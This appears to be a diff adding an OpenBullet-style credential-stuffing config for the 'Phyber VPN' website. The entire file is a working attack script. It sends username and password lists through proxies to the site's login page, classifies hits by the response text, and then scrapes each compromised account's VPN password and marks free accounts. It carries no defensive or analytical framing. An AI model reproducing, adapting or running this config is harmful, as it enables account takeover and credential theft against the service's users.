@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Phyber VPN",
+  "SuggestedBots": 107,
+  "LastModified": "2019-04-07T16:18:51.2717799+07:00",
+  "AdditionalInfo": "",
+  "Author": "*",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.phybervpn.com/clients/login.php" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&loginBtn=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password entered!" 
+  KEYCHAIN Success OR 
+    KEY "index.php" 
+  KEYCHAIN Success OR 
+    KEY "You have logged in successfully. Redirecting..." 
+REQUEST GET "https://www.phybervpn.com/clients/index.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<span class=\"uk-text-muted uk-text-small\">VPN Password:</span><h2 class=\"uk-margin-remove uk-text-small\">" "</span> " Recursive=FALSE -> VAR "VPN Password" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "-</span>" 
